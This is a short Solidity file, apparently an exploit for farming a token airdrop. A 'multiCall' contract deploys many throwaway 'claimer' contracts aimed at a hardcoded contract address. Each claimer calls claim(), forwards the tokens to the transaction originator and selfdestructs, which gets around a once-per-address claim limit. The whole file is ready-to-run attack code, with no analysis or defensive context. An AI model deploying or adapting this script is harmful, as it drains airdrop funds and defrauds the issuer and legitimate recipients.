pragma solidity ^0.8.0;

interface airdrop {
  function transfer(address recipient, uint256 amount) external;

  function balanceOf(address account) external view returns (uint256);

  function claim() external;
}

contract claimer {
  constructor(address contra) {
    airdrop(contra).claim();
    uint256 balance = airdrop(contra).balanceOf(address(this));
    // require(balance>0,'Oh no');
    airdrop(contra).transfer(address(tx.origin), balance);
    selfdestruct(payable(address(msg.sender)));
  }
}

contract multiCall {
  address constant contra = address(0x495443CA9Df3ccd9EC480814Bf01CA812EB4CB10);

  function call(uint256 times) public {
    for (uint256 i = 0; i < times; ++i) {
      new claimer(contra);
    }
  }
}